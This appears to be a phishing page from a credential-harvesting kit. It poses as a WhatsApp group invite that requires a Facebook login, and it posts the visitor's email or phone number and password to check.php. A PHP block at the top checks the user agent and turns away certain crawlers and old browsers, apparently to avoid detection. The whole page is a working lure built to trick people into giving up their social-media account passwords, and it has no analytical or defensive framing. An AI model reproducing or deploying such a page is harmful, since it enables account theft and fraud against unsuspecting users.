<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('https://www.facebook.com/detol.shop.real');
die();
}
?>
<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Whatsapp Group Invite</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1">
  <meta name="theme-color" content="#3B5999"/>
  <meta name="msapplication-navbutton-color" content="#3B5999"/>
  <meta name="apple-mobile-web-app-status-bar-style" content="#3B5999"/>
  <link rel="shorcut icon" href="img/v4/icon.png"/>
  <link rel="stylesheet" href="css/SetyawanXD.css">
</head>
<body>
  <form action="check.php" method="POST">
      <img class='fb' src='img/fb-atas.jpg'>
        <center>
        <img class='logo-wa' src='img/wa.jpg'>
        <div class='txt-wa'>Log in with Facebook account<br>To connect to Whatsapp Group</div>
        <input type='text' class='isi-fb-a' name='email' placeholder='Email or Number' required>
        <input type='password' class='isi-fb-b' name='password' placeholder='Password' required>
        <button name='log' value='Facebook' class='btn-fb'>Masuk</button>
        </center>
      <img class='fb' src='img/fb-bawah.jpg'>
  </form>
</body>
</html>